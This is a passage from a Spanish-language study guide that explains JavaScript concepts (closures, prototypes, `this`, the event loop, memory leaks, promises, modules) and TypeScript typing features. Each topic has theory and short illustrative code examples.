    cierto intervalo, sin importar cuántos eventos lleguen mientras tanto
    (ideal para un handler de `scroll` que actualiza una barra de
    progreso).
  - **Ejemplo**:
    ```js
    function debounce(fn, delay) {
      let timeoutId;
      return (...args) => {
        clearTimeout(timeoutId); // cancela la ejecución pendiente anterior
        timeoutId = setTimeout(() => fn(...args), delay);
      };
    }

    const buscarDebounced = debounce(buscarProductos, 300);
    input.addEventListener('input', (e) => buscarDebounced(e.target.value));
    // Si el usuario escribe "zapato" en 300ms, buscarProductos solo se llama
    // UNA vez con "zapato", no una vez por cada letra.
    ```

- Métodos de array de alto orden e inmutabilidad

  - **Teoría**: `map`, `filter` y `reduce` **no mutan** el array original,
    siempre devuelven uno nuevo. Se prefieren sobre un `for` con mutación
    directa (`push`, `splice`, asignar por índice) porque el código
    resultante es más declarativo (dice *qué* quieres, no *cómo* iterar) y
    porque React (y otras librerías de estado) dependen de que las
    actualizaciones sean inmutables para detectar cambios correctamente.

    Diferencia entre los tres:
    - `map` — transforma **cada** elemento; devuelve un array **del mismo tamaño**.
    - `filter` — decide **quién queda** (true/false); devuelve un array **igual o más corto**.
    - `reduce` — acumula todo en **un solo valor** (número, objeto, array, etc.).

    Regla rápida: ¿mismo array pero cambiado? → `map`. ¿Solo algunos? →
    `filter`. ¿Un resumen / resultado final? → `reduce`. Orden típico al
    encadenarlos: filtrar → mapear → reducir.
  - **Ejemplo**:
    ```js
    const precios = [10, 20, 30];

    // Malo: muta el array original (problemático si "precios" es estado de React)
    precios.push(40);

    // map — transforma cada uno → array del mismo tamaño
    const conDescuento = precios.map((p) => p * 0.9);
    // [9, 18, 27]

    // filter — deja pasar solo los que cumplen → array igual o más corto
    const caros = precios.filter((p) => p > 15);
    // [20, 30]

    // reduce — acumula en un solo valor
    const total = precios.reduce((acumulado, p) => acumulado + p, 0);
    // 60

    // Encadenados: filtrar → mapear → reducir
    const productos = [
      { nombre: 'Zapato', precio: 80, stock: true },
      { nombre: 'Gorra', precio: 20, stock: false },
      { nombre: 'Camisa', precio: 45, stock: true },
    ];

    const totalEnStock = productos
      .filter((p) => p.stock) // solo con stock
      .map((p) => p.precio) // de objeto → número
      .reduce((sum, precio) => sum + precio, 0); // suma
    // 125 (80 + 45)
    ```

- Manejo de errores

  - **Teoría**: `try/catch/finally` captura errores en tiempo de
    ejecución sin detener toda la aplicación. Se pueden crear errores
    personalizados extendiendo la clase `Error` para distinguir tipos de
    fallo. La distinción importante (ya vista en la sección 8 de
    `GOOD-FRONTEND-PRACTICES.md`) es entre un error **esperado** (se
    maneja con UI, no se reporta) y uno **inesperado** (sí se reporta a
    monitoreo).
  - **Ejemplo**:
    ```js
    class ValidationError extends Error {
      constructor(message) {
        super(message);
        this.name = 'ValidationError';
      }
    }

    try {
      if (!email.includes('@')) throw new ValidationError('Email inválido');
      await guardarUsuario(email);
    } catch (err) {
      if (err instanceof ValidationError) {
        mostrarErrorFormulario(err.message); // esperado: se maneja en UI
      } else {
        Sentry.captureException(err); // inesperado: se reporta
      }
    } finally {
      setLoading(false); // se ejecuta siempre, haya error o no
    }
    ```

- Quirks de tipos primitivos

  - **Teoría**: JavaScript arrastra algunas inconsistencias históricas
    que nunca se corrigieron por compatibilidad hacia atrás. Conocerlas
    evita perder tiempo depurando algo que en realidad es un
    comportamiento documentado del lenguaje.
  - **Ejemplo**:
    ```js
    typeof null; // "object" -- bug histórico del lenguaje desde 1995

    NaN === NaN; // false -- NaN nunca es igual a sí mismo
    Number.isNaN(NaN); // true -- forma correcta de verificarlo

    0.1 + 0.2; // 0.30000000000000004 -- precisión de punto flotante (IEEE 754)
    ```

### En profundidad

- Scope y Closures

  - **Teoría**: en una frase — **scope** = qué variables puedes ver;
    **closure** = una función que se lleva ese scope consigo aunque la
    función exterior ya terminó.

    **Scope** (ámbito) determina desde dónde es visible una variable.
    Hay tres niveles comunes: global, de función y de bloque. JavaScript
    usa *lexical scoping*: el ámbito se decide por **dónde se escribió**
    la función en el código, no por dónde se llama después.

    ```js
    const global = 'todos me ven'; // scope global

    function ejemplo() {
      const local = 'solo dentro de ejemplo'; // scope de función

      if (true) {
        const bloque = 'solo dentro del if'; // scope de bloque
      }
      // aquí: global ✓, local ✓, bloque ✗
    }
    // aquí: global ✓, local ✗, bloque ✗
    ```

    Un **closure** es cuando una función **sigue recordando** variables
    de afuera aunque esa función "afuera" ya terminó. Analogía: sales de
    una habitación, pero te llevas una caja con las cosas que había
    dentro — la habitación ya no existe; la caja sí. No es magia: el
    motor de JS mantiene viva esa variable en memoria mientras exista
    una función que todavía pueda leerla. Es la base de contadores
    privados, memoización y hooks; también una causa frecuente de
    *memory leaks* si el closure guarda referencias grandes y nunca se
    suelta (ver el punto de memoria más abajo).
  - **Ejemplo paso a paso**:
    ```ts
    function crearContador() {
      let cuenta = 0; // variable "privada", vive en el scope de crearContador

      return function incrementar() {
        cuenta++; // el closure "recuerda" cuenta aunque crearContador ya terminó
        return cuenta;
      };
    }

    const contador1 = crearContador();
    contador1(); // 1
    contador1(); // 2

    const contador2 = crearContador(); // scope nuevo e independiente
    contador2(); // 1 (no comparte estado con contador1)
    ```
    Paso a paso: (1) `crearContador()` se ejecuta y crea `cuenta = 0` en su
    propio scope; (2) retorna la función `incrementar`, que quedó "cerrada"
    sobre ese scope (se lleva la "caja" con `cuenta`); (3) aunque
    `crearContador()` ya devolvió y su ejecución terminó, `cuenta` sigue
    viva en memoria porque `incrementar` todavía la referencia; (4) cada
    llamada a `crearContador()` crea un scope nuevo, por eso `contador1` y
    `contador2` no comparten `cuenta`.

- Prototypes y herencia prototípica

  - **Teoría**: en una frase — **prototipo** = el objeto "padre" al que se
    pregunta si falta una propiedad; **herencia prototípica** = buscar
    hacia arriba en esa cadena hasta encontrarla o llegar a `null`;
    **`class`** = forma moderna de escribir eso, no un sistema distinto.

    A diferencia de lenguajes con clases "de verdad" (Java, C#), JavaScript
    no copia métodos a cada instancia. Cada objeto tiene un **enlace** a
    otro objeto (su prototipo). Si no encuentra algo en sí mismo, pregunta
    al de arriba. Eso es la **cadena de prototipos**.

    Analogía — una fila de cajas:

    ```
    perro  →  Animal.prototype  →  Object.prototype  →  null
    ```

    Preguntas: "¿tienes `saludar`?" (1) `perro` mira su propia caja → no;
    (2) mira `Animal.prototype` → sí → lo usa. No se copia el método a
    `perro`; `perro` **usa el de arriba**.

    Cada objeto tiene una referencia interna `[[Prototype]]` (accesible
    con `Object.getPrototypeOf()`). Al hacer `new Animal('Rex')`, JS:
    (1) crea un objeto vacío; (2) le pone `[[Prototype]]` =
    `Animal.prototype`; (3) ejecuta `Animal` con `this` = ese objeto;
    (4) lo devuelve. Por eso `nombre` vive **en la instancia** y
    `saludar` se busca **en el prototipo** (compartido entre instancias).

    La sintaxis `class` es **azúcar sintáctico**: por debajo sigue siendo
    prototipos — `class Foo {}` crea una función constructora y define
    sus métodos en `Foo.prototype`.
  - **Ejemplo paso a paso**:
    ```ts
    function Animal(nombre) {
      this.nombre = nombre; // propiedad propia de cada instancia
    }
    Animal.prototype.saludar = function () {
      return `Hola, soy ${this.nombre}`;
    };

    const perro = new Animal('Rex');
    perro.saludar(); // "Hola, soy Rex"

    // Varias instancias comparten el mismo saludar en memoria
    const otro = new Animal('Luna');
    perro.saludar === otro.saludar; // true
    ```
    Paso a paso al llamar `perro.saludar()`: (1) el motor busca `saludar`
    directamente en `perro` — no está; (2) sube a `Object.getPrototypeOf(perro)`,
    que es `Animal.prototype` — ahí sí encuentra `saludar`; (3) lo ejecuta
    con `this` apuntando a `perro` (usa `this.nombre` = `'Rex'`).

    Con `class` es lo mismo, más legible:
    ```ts
    class Animal {
      constructor(nombre) {
        this.nombre = nombre;
      }
      saludar() {
        return `Hola, soy ${this.nombre}`;
      }
    }

    class Perro extends Animal {
      ladrar() {
        return 'guau';
      }
    }

    const rex = new Perro();
    rex.ladrar(); // en Perro.prototype
    rex.saludar(); // no está en Perro → sube a Animal.prototype
    // cadena: rex → Perro.prototype → Animal.prototype → Object.prototype → null
    ```

- Contexto de ejecución y `this`

  - **Teoría**: en una frase — **`this`** = el objeto "dueño" de la
    llamada actual. Si llamas `obj.fn()`, `this` es `obj`. Si llamas
    `fn()` suelta, se pierde. Las **arrows** no cambian de `this`: se
    quedan con el del sitio donde se definieron.

    `this` **no** se decide por dónde **escribiste** la función (eso es
    el scope). Se decide por **cómo la llamas**. Analogía: `this` es
    "quién me está llamando ahora", no "dónde nací".

    Las cuatro reglas, de menor a mayor prioridad:

    1. Llamada suelta `fn()` → `this` es `undefined` en modo estricto
       (o el objeto global si no).
    2. Método de un objeto `obj.fn()` → `this` es `obj` (la clave es el
       punto delante).
    3. `fn.call(ctx)` / `fn.apply(ctx)` / `bind` → `this` es `ctx`
       explícito; tú lo eliges.
    4. `new Fn()` → `this` es el objeto recién creado.

    Las **arrow functions** son la excepción: no tienen su propio
    `this`, heredan el del scope léxico donde se definieron — por eso
    son la solución habitual al bug de "perder el `this`" en callbacks.

    Scope vs `this` (para no mezclarlos): el scope/closures se decide
    por **dónde** escribiste la función; `this` por **cómo** la llamas
    (salvo arrows, que sí usan el sitio donde se escribieron).
  - **Ejemplo paso a paso**:
    ```ts
    // Regla 2: el punto decide this
    const botonObj = {
      etiqueta: 'Guardar',
      click: function () {
        console.log(this.etiqueta);
      },
    };
    botonObj.click(); // "Guardar" — this = botonObj

    // Bug clásico: perder this al llamar "suelta"
    const handlerRoto = botonObj.click;
    handlerRoto(); // undefined — ya no hay "botonObj." delante

    class Boton {
      etiqueta = 'Guardar';

      // function normal: this depende de cómo la llames
      onClickRoto = function () {
        console.log(this.etiqueta); // se rompe si la llaman suelta
      };

      // arrow: this siempre es la instancia de Boton
      onClickCorrecto = () => {
        console.log(this.etiqueta); // "Guardar" — siempre
      };
    }

    const boton = new Boton();
    const handler = boton.onClickCorrecto;
    handler(); // sigue "Guardar" aunque se llame suelta, sin boton.
    ```

- El Event Loop: call stack, microtasks y macrotasks

  - **Teoría**: en una frase — **call stack** = lo que corre ahora;
    **microtasks** (promesas) = cola prioritaria, se vacía entera;
    **macrotasks** (`setTimeout`, etc.) = cola normal, una por ciclo;
    **event loop** = el que aplica ese orden una y otra vez.

    JavaScript es de un solo hilo (*single-threaded*): solo puede
    ejecutar una cosa a la vez. El event loop es el "recepcionista" que
    decide qué toca después cuando hay trabajo asíncrono.

    Piezas:
    - **Call stack** — pila donde corre el código ahora. Mientras no
      esté vacío, el event loop espera.
    - **Microtasks** — promesas resueltas (`.then`), `queueMicrotask`.
      Prioridad alta: se procesan **todas**.
    - **Macrotasks** — `setTimeout`, `setInterval`, eventos de I/O.
      Prioridad baja: se toma **una** por ciclo.

    Ciclo del event loop: (1) vacía el call stack (código síncrono);
    (2) ejecuta **todas** las microtasks pendientes; (3) toma **una**
    macrotask; (4) repite. Por eso una promesa siempre corre antes que
    un `setTimeout(fn, 0)`, aunque ambos se hayan "programado" en el
    mismo instante. `setTimeout(..., 0)` no significa "ya": significa
    "en la próxima macrotask", después de las microtasks.

    Analogía — cocina con un solo chef (call stack): termina el plato
    actual; atiende **todos** los tickets urgentes (microtasks); atiende
    **un** pedido de la fila normal (macrotask); repite.

    Importa en frontend para el orden de logs/bugs de timing; una cadena
    larga de `.then()` puede retrasar el pintado de la UI (el navegador
    pinta entre macrotasks); `await` también encola microtasks.
  - **Ejemplo paso a paso**:
    ```ts
    console.log('1: síncrono');

    setTimeout(() => console.log('2: macrotask (setTimeout)'), 0);

    Promise.resolve().then(() => console.log('3: microtask (promise)'));

    console.log('4: síncrono');

    // Orden real de salida: 1, 4, 3, 2
    ```
    Paso a paso: (1) imprime `1`; (2) programa el `setTimeout` → cola de
    macrotasks; (3) programa el `.then` → cola de microtasks; (4)
    imprime `4`; (5) stack vacío → vacía microtasks → imprime `3`;
    (6) toma una macrotask → imprime `2`. Esta prioridad de microtasks
    es también la razón por la que una cadena larga de `.then()` puede
    "hambrear" el renderizado del navegador si nunca le cede el turno a
    una macrotask.

- Memory management y memory leaks

  - **Teoría**: en una frase — **GC** = el motor tira lo que ya no es
    alcanzable; **leak** = mantienes una referencia accidental (listener,
    timer, closure) y bloqueas esa liberación; **fix típico** = cleanup
    en `useEffect` (`removeEventListener`, `clearInterval`, etc.).

    JavaScript tiene *garbage collection* automático: tú no haces
    `free()` como en C. El motor libera memoria de objetos que ya no son
    alcanzables desde ninguna raíz activa (variables globales, el call
    stack, closures vivos), usando principalmente *mark-and-sweep*:
    (1) parte de las raíces; (2) **marca** todo lo alcanzable siguiendo
    referencias; (3) **libera** lo que no quedó marcado.

    Analogía: el basurero solo recoge lo que **nadie tiene en la mano**.
    Si dejas un hilo atado a una caja vieja, esa caja nunca se tira.

    ```js
    let user = { name: 'Ana' }; // alcanzable → vive
    user = null; // nadie lo apunta → se puede liberar
    ```

    Un **memory leak** en JS no es "olvidar liberar memoria" — es
    mantener accidentalmente una referencia a algo que ya no necesitas.
    Las tres causas más comunes en frontend: listeners nunca removidos,
    `setInterval`/`setTimeout` nunca limpiados, y closures que retienen
    referencias a nodos del DOM o datos grandes ya "descartados".
  - **Ejemplo**:
    ```tsx
    // 1) Listeners — malo: cada montaje suma uno; al desmontar sigue vivo
    useEffect(() => {
      window.addEventListener('resize', handleResize);
    }, []);

    // Bueno: cleanup al desmontar
    useEffect(() => {
      window.addEventListener('resize', handleResize);
      return () => window.removeEventListener('resize', handleResize);
    }, []);

    // 2) Timers — sin clearInterval sigue corriendo tras desmontar
    useEffect(() => {
      const id = setInterval(() => fetchData(), 1000);
      return () => clearInterval(id);
    }, []);

    // 3) Closures que agarran datos grandes / DOM
    function attach(el) {
      const huge = /* datos enormes */;
      el.addEventListener('click', () => {
        console.log(huge.length); // el listener guarda `huge` vivo
      });
    }
    ```
    Para detectar leaks reales: Chrome DevTools → pestaña **Memory** →
    tomar dos "heap snapshots" (antes y después de montar/desmontar el
    mismo componente varias veces) y comparar — si la memoria crece de
    forma sostenida sin bajar nunca, hay un leak. Si sube y luego baja,
    era uso normal + GC.

- Promises, async/await y generators

  - **Teoría**: en una frase — **Promise** = valor futuro (`pending` / ok /
    error); **async/await** = misma Promise escrita como si fuera
    síncrona (`await` pausa solo esa función y reanuda como microtask);
    **generator** = pausa/reanuda a mano; `async/await` es esa idea
    aplicada a Promises.

    Trabajo asíncrono = "esto todavía no está listo; avísame cuando sí".
    Evolución del estilo: callbacks anidados → Promises (`.then`) →
    `async/await` → (por debajo, idea de generators).

    Una **Promise** es un objeto que representa un valor que existirá en
    el futuro, con tres estados: *pending* (esperando), *fulfilled*
    (éxito → `.then`), *rejected* (fallo → `.catch`). Analogía: ticket de
    un restaurante — no tienes la comida aún; el ticket *es* la promesa
    de que llegará.

    `async/await` es azúcar sintáctico sobre Promises: se **lee** como
    código síncrono, pero **no bloquea** el hilo. Una `async function`
    siempre devuelve una Promise. Cada `await`: (1) recibe una Promise;
    (2) pausa *solo esta función*; (3) el resto del programa sigue
    (event loop, UI); (4) al resolverse, reanuda como **microtask**.

    Los **generators** (`function*`, `yield`) son el mecanismo de más
    bajo nivel: una función que se puede pausar y reanudar a voluntad.
    Conceptualemente, `async/await` es un generator que se auto-reanuda
    cada vez que la Promise de un `yield`/`await` se resuelve. No hace
    falta escribir generators a diario; sirven para entender por qué
    `await` puede "pausar" sin congelar el hilo.

    Relación con el event loop: `await` / `.then` → microtask;
    `setTimeout` → macrotask.
  - **Ejemplo paso a paso**:
    ```ts
    // Con Promises encadenadas
    function obtenerUsuario(id) {
      return fetch(`/api/users/${id}`)
        .then((res) => res.json())
        .then((user) => fetch(`/api/orders?userId=${user.id}`))
        .then((res) => res.json());
    }

    // Lo mismo con async/await: misma ejecución, más legible
    async function obtenerUsuario(id) {
      const res = await fetch(`/api/users/${id}`); // pausa aquí sin bloquear el hilo
      const user = await res.json();
      const ordersRes = await fetch(`/api/orders?userId=${user.id}`);
      return await ordersRes.json();
    }

    // Generator: pausa/reanuda a mano (idea detrás de async/await)
    function* contador() {
      yield 1;
      yield 2;
      return 3;
    }
    const g = contador();
    g.next(); // { value: 1, done: false }
    g.next(); // { value: 2, done: false }
    g.next(); // { value: 3, done: true }
    ```
    Paso a paso en la versión `async/await`: (1) se llama `fetch(...)`, que
    devuelve una Promise inmediatamente; (2) `await` pausa *solo esta
    función* (no bloquea el hilo — otras tareas siguen corriendo) hasta que
    esa Promise se resuelve; (3) cuando se resuelve, la continuación de la
    función se reanuda como una **microtask** (por eso conecta
    directamente con el punto del event loop de arriba).

- Módulos: ESM vs CommonJS

  - **Teoría**: en una frase — **CommonJS** (`require`) = módulos de Node
    antiguos, dinámicos en runtime; **ESM** (`import`/`export`) =
    estándar actual, estático, permite **tree-shaking**; en frontend
    moderno, piensa en **ESM**.

    Un módulo es un archivo que **exporta** cosas e **importa** de otros,
    en lugar de mezclarlo todo en un scope global.

    **CommonJS** (`require`/`module.exports`) es el sistema original de
    Node.js: la resolución es **síncrona** y **dinámica** (puedes hacer
    `require(variable)` o `require` dentro de un `if` en tiempo de
    ejecución). Sigue apareciendo en packages viejos de Node.

    **ESM** (*ECMAScript Modules*, `import`/`export`) es el estándar
    oficial del lenguaje: la resolución es **estática** (los `import` se
    analizan *antes* de ejecutar; no se pueden condicionar con lógica
    “clásica”). Eso permite algo que CommonJS no hace bien:
    **tree-shaking** — el bundler sabe exactamente qué exports se usan y
    elimina del bundle el código que nunca se importa.

    Analogía: CommonJS = “abre la caja cuando llegues”; ESM = “la lista
    de contenido viene en la etiqueta” → puedes dejar lo que no necesitas
    en el almacén.
  - **Ejemplo**:
    ```js
    // CommonJS: dinámico, resuelto en runtime
    const { calcularDescuento } = require('./utils');
    module.exports = { procesarPedido };

    // También válido en CJS: el path se decide en runtime
    const nombre = condicion ? './a' : './b';
    const mod = require(nombre);

    // ESM: estático, analizable antes de ejecutar -> permite tree-shaking
    import { calcularDescuento } from './utils.js';
    export { procesarPedido };
    ```
    Si `utils.js` exporta 10 funciones pero solo usas `calcularDescuento`,
    un bundler moderno (Vite, esbuild, Rollup) puede eliminar las otras 9
    del bundle final gracias a que el `import` es estático — con
    `require()` dinámico no puede garantizar esa seguridad y las incluye
    todas.

## 3. TypeScript avanzado

### Básico

- Tipado estructural (*duck typing*) vs tipado nominal

  - **Teoría**: en lenguajes de tipado nominal (Java, C#) dos tipos son
    compatibles solo si uno declara explícitamente que extiende o
    implementa al otro. TypeScript usa **tipado estructural**: le importa
    la *forma* del valor (qué propiedades tiene y de qué tipo), no el
    nombre del tipo con el que fue declarado. Si un objeto "tiene la forma
    que se espera", es compatible, aunque nunca se haya declarado como ese
    tipo explícitamente.
  - **Ejemplo**:
    ```ts
    interface Punto {
      x: number;
      y: number;
    }

    function imprimir(p: Punto) {
      console.log(`${p.x}, ${p.y}`);
    }

    // "vector" nunca se declaró como Punto, pero tiene la misma forma:
    // TypeScript lo acepta sin problema (tipado estructural)
    const vector = { x: 1, y: 2, z: 3 }; // incluso con una propiedad extra
    imprimir(vector); // válido
    ```

- `interface` vs `type`

  - **Teoría**: en una frase — **`interface`** = contratos de objetos,
    extensibles y fusionables; **`type`** = alias flexible (uniones,
    intersecciones, lo que sea); para objetos simples, **ambos sirven**.

    Ambos describen la forma de un objeto y en la mayoría de casos son
    intercambiables. La diferencia no es "cuál es mejor", sino qué puede
    hacer cada uno.

    Lo que destaca `interface`: se puede **extender** con `extends` y
    admite *declaration merging* (declarar la misma interface dos veces
    combina sus propiedades — útil para tipar/ampliar librerías de
    terceros). Un `type` **no** se fusiona así.

    Lo que destaca `type`: puede describir uniones, intersecciones,
    tuplas y alias de primitivos — cosas que una `interface` no puede.

    Regla práctica: usa `interface` para formas de objetos/props que
    pueden necesitar extenderse; usa `type` para uniones, intersecciones
    o alias de cualquier otra cosa. Si el equipo ya tiene convención,
    la consistencia importa más que la pelea entre ambos.
  - **Ejemplo**:
    ```ts
    // Ambos pueden describir un objeto
    interface Usuario {
      nombre: string;
    }
    // type Usuario = { nombre: string }; // equivalente

    interface UsuarioAdmin extends Usuario {
      permisos: string[];
    }

    // Declaration merging: solo interface
    interface Ventana {
      titulo: string;
    }
    interface Ventana {
      ancho: number;
    }
    // Ventana = { titulo: string; ancho: number }

    // type puede describir una unión: interface no puede hacer esto
    type Estado = 'cargando' | 'listo' | 'error';

    // type con intersección (equivalente a extends en este caso)
    type UsuarioAdmin2 = Usuario & { permisos: string[] };

    type ID = string | number;
    type Par = [string, number];
    ```

- `any` vs `unknown` vs `never`

  - **Teoría**: en una frase — **`any`** = cualquier cosa y sin chequeo
    (peligroso); **`unknown`** = cualquier cosa, pero verifica antes de
    usar; **`never`** = valor imposible / código que no debería
    alcanzarse.

    Son tres extremos distintos:

    - `any` **desactiva** el chequeo de tipos por completo (puedes hacer
      cualquier cosa sin que TypeScript se queje — es el escape hatch;
      úsalo lo menos posible).
    - `unknown` es el opuesto seguro: acepta cualquier valor, pero **te
      obliga a verificar el tipo** antes de operar con él (no puedes
      llamar métodos ni acceder propiedades directamente). Ideal para
      data externa (`JSON.parse`, respuestas de API). Analogía: `any` =
      caja abierta a ciegas; `unknown` = caja cerrada, primero miras la
      etiqueta.
    - `never` representa un valor que **nunca ocurre** — una función que
      siempre lanza una excepción retorna `never`, y también aparece
      cuando TypeScript detecta que un `switch` cubrió todos los casos
      posibles (*exhaustiveness checking*).

    Regla práctica: ¿no sabes el tipo y quieres seguridad? → `unknown`.
    ¿Apagar TypeScript? → `any` (casi nunca). ¿Rama/retorno imposible? →
    `never`.
  - **Ejemplo**:
    ```ts
    function procesar(valor: any) {
      valor.metodoQueNoExiste(); // compila sin error -- any lo permite todo, es peligroso
    }

    function procesarSeguro(valor: unknown) {
      // valor.metodoQueNoExiste(); // Error: hay que verificar el tipo primero
      if (typeof valor === 'string') {
        valor.toUpperCase(); // válido: ya se verificó que es string
      }
    }

    function lanzarError(): never {
      throw new Error('esto siempre falla');
    }

    // Exhaustiveness: si añades un estado nuevo, el default falla al compilar
    type Estado = 'ok' | 'error';
    function handle(e: Estado) {
      switch (e) {
        case 'ok':
          return;
        case 'error':
          return;
        default: {
          const _exhaustive: never = e;
        }
      }
    }
    ```

- Union types (`|`) e Intersection types (`&`)

  - **Teoría**: una **unión** (`|`) dice "puede ser esto O aquello" — el
    valor solo tiene garantizadas las propiedades comunes a ambos tipos
    hasta que se "estrecha" (narrowing) a uno específico. Una
    **intersección** (`&`) dice "debe cumplir esto Y aquello a la vez" —
    combina todas las propiedades de ambos tipos en uno solo.
  - **Ejemplo**:
    ```ts
    type Perro = { ladra: () => void };
    type Gato = { maulla: () => void };

    type Mascota = Perro | Gato; // ladra() O maulla(), no se sabe cuál sin narrowing
    type PerroGuardian = Perro & { tamaño: 'grande' }; // debe tener ladra() Y tamaño
    ```

- Type narrowing básico (`typeof`, `instanceof`, `in`)

  - **Teoría**: cuando una variable tiene un union type, TypeScript puede
    "reducir" (narrow) las opciones posibles dentro de un bloque
    condicional, según qué comprobación uses: `typeof` para primitivos,
    `instanceof` para instancias de clases, y `in` para verificar si una
    propiedad existe en el objeto (útil para distinguir formas de objetos
    planos que no son instancias de clase).
  - **Ejemplo**:
    ```ts
    function formatear(valor: string | number) {
      if (typeof valor === 'string') {
        return valor.toUpperCase(); // aquí TS ya sabe que es string
      }
      return valor.toFixed(2); // aquí TS ya sabe que es number
    }

    type Perro = { ladra: () => void };
    type Gato = { maulla: () => void };
    function hacerSonido(mascota: Perro | Gato) {
      if ('ladra' in mascota) {
        mascota.ladra(); // narrowing por presencia de propiedad
      } else {
        mascota.maulla();
      }
    }
    ```

- Optional (`?`) y `readonly`

  - **Teoría**: `?` marca una propiedad como opcional (puede no existir en
    el objeto, su tipo real es `T | undefined`). `readonly` no impide
    mutar el objeto en tiempo de ejecución (es un chequeo que existe solo
    en tiempo de compilación, se pierde al compilar a JS) pero evita que
    el propio código, por error, reasigne una propiedad que se pensó como
    fija.
  - **Ejemplo**:
    ```ts
    interface Config {
      timeout?: number; // opcional: puede omitirse al crear el objeto
      readonly apiKey: string; // no se puede reasignar después de crear el objeto
    }

    const config: Config = { apiKey: 'abc123' }; // válido sin timeout
    config.apiKey = 'otra'; // Error de compilación: es readonly
    ```

- Type assertions (`as`)

  - **Teoría**: `as` le dice al compilador "confía en mí, yo sé que esto
    es de este tipo", **sin** verificarlo en tiempo de ejecución. No
    convierte el valor (no es un cast real como en otros lenguajes), solo
    calla al compilador. Es razonablemente seguro cuando tú tienes
    información que TypeScript no puede inferir (el resultado de
    `document.getElementById`, que TS tipa como `HTMLElement | null`
    genérico); es peligroso cuando se usa como atajo para evitar tipar
    bien algo (`as any`, `as unknown as X`), porque apaga la protección
    que TypeScript te está dando.
  - **Ejemplo**:
    ```ts
    // Razonable: tú sabes que este elemento es un input, TS solo ve HTMLElement
    const input = document.getElementById('email') as HTMLInputElement;
    input.value; // sin el "as", esto sería un error (HTMLElement no tiene .value)

    // Peligroso: silencia un error real en vez de arreglarlo
    const datos = respuestaDelServidor as any as Usuario;
    ```

- Enums vs uniones de literales de string

  - **Teoría**: en una frase — **unión de literales** = mismos valores
    fijos, sin código JS extra, mejor para JSON; **`enum`** = también
    valores fijos, pero genera un objeto real y (si es numérico) se
    vuelve opaco al serializar. Preferencia moderna: **unión**, salvo
    que necesites el objeto en runtime.

    Ambos sirven para decir: "esta variable solo puede ser uno de estos
    valores fijos". TypeScript incluye `enum` como construcción propia,
    pero hoy muchos equipos prefieren **uniones de literales de string**
    para el mismo propósito: son más simples, no generan código JS extra
    en el bundle (un `enum` numérico sí compila a un objeto real), y
    funcionan mejor con serialización JSON (un enum numérico pierde
    legibilidad al serializarse como `0`, `1`, `2`).

    Cuándo sí tiene sentido un `enum`: convención del equipo/librería,
    necesitas el objeto en runtime (`Object.values(Estado)`), o código
    legacy. Para estados de UI, flags de API, roles, etc., la unión
    suele bastar.
  - **Ejemplo**:
    ```ts
    // Con enum: genera un objeto JS real en el output compilado
    enum EstadoEnum {
      Cargando, // 0
      Listo, // 1
      Error, // 2
    }
    EstadoEnum.Cargando; // 0 — en JSON se ve el número, no el nombre

    // Enum de strings: más legible, pero sigue generando código JS
    enum EstadoStr {
      Cargando = 'cargando',
      Listo = 'listo',
      Error = 'error',
    }

    // Con unión de literales: no genera nada extra, mismo chequeo de tipos
    type Estado = 'cargando' | 'listo' | 'error';

    function render(estado: Estado) {
      if (estado === 'cargando') return <Spinner />;
      // TypeScript autocompleta y valida los tres valores posibles
    }
    ```

### En profundidad

- Generics

  - **Teoría**: un generic es un "tipo parametrizado" — en vez de fijar un
    tipo concreto, defines una función/tipo que funciona con cualquier
    tipo `T` que se le pase, preservando la relación entre la entrada y la
    salida. `extends` sobre un generic (*constraint*) limita qué tipos son
    válidos; un valor por defecto (`= Tipo`) se usa si no se especifica
    ninguno.
  - **Ejemplo paso a paso**:
    ```ts
    // Sin generics: pierdes el tipo específico, todo se vuelve unknown
    function primeroSinGenerics(lista: unknown[]): unknown {
      return lista[0];
    }

    // Con generics: T "viaja" desde el argumento hasta el retorno
    function primero<T>(lista: T[]): T {
      return lista[0];
    }
    const numero = primero([1, 2, 3]); // T se infiere como number
    const texto = primero(['a', 'b']); // T se infiere como string

    // Constraint: T debe tener una propiedad "id"
    function buscarPorId<T extends { id: number }>(lista: T[], id: number): T | undefined {
      return lista.find((item) => item.id === id);
    }
    ```
    Paso a paso al llamar `primero([1, 2, 3])`: (1) TypeScript ve que el
    argumento es `number[]`; (2) infiere `T = number` para esa llamada
    específica; (3) sabe, sin que lo digas explícitamente, que el retorno
    será `number` — esa es la ventaja frente a `unknown`: la relación
    entrada-salida queda tipada.

- Conditional types e `infer`

  - **Teoría**: en una frase — **conditional type** = `if` a nivel de
    tipos (`T extends U ? X : Y`); **`infer`** = dentro de ese `if`,
    captura un fragmento del tipo y reutilízalo. Ejemplo clásico: sacar
    el retorno de una función → `ReturnType`.

    Un *conditional type* aplica lógica condicional a nivel de tipos:
    `T extends U ? X : Y` — "si T es asignable a U, el tipo resultante
    es X; si no, es Y". Analogía: como un ternario `condicion ? a : b`,
    pero TypeScript lo resuelve al **compilar**, no al correr.

    `infer` se usa **dentro** de un conditional type para "capturar" y
    nombrar una parte del tipo que estás inspeccionando, y reutilizarla
    en el resultado. Sin `infer` solo preguntas "¿es esto o aquello?";
    con `infer` preguntas "si es una función, **qué tipo retorna**?".

    Es la base de utility types como `ReturnType<T>`. También sirve para
    derivar el tipo de elementos de un array o el valor dentro de una
    Promise. Se usa más al tipar utilidades/librerías que en UI día a
    día, pero explica de dónde salen muchos helpers de TypeScript.
  - **Ejemplo paso a paso**:
    ```ts
    // Conditional type simple
    type EsString<T> = T extends string ? true : false;
    type A = EsString<'hola'>; // true
    type B = EsString<42>; // false

    // Reimplementando ReturnType con infer
    type MiReturnType<T> = T extends (...args: any[]) => infer R ? R : never;
    // Léelo: si T es función (...)=>algo, captura ese algo como R; si no, never

    function obtenerUsuario() {
      return { nombre: 'Ana', edad: 30 };
    }
    type Usuario = MiReturnType<typeof obtenerUsuario>;
    // Usuario = { nombre: string; edad: number }

    // Otros usos típicos de infer
    type ElementoDe<T> = T extends (infer U)[] ? U : never;
    type DentroDePromise<T> = T extends Promise<infer U> ? U : T;
    ```
    Paso a paso: (1) `T` es el tipo de la función `obtenerUsuario`; (2)
    TypeScript verifica si `T` calza con el patrón "una función que
    retorna algo"; (3) `infer R` le dice "sea lo que sea ese retorno,
    llámalo `R` y captúralo"; (4) como sí calza, el resultado es `R`, que
    en este caso es `{ nombre: string; edad: number }`.

- Mapped types y utility types

  - **Teoría**: un *mapped type* construye un tipo nuevo iterando sobre
    las claves de otro tipo existente (`[K in keyof T]`). Los utility
    types que vienen incluidos en TypeScript (`Partial`, `Pick`, `Omit`,
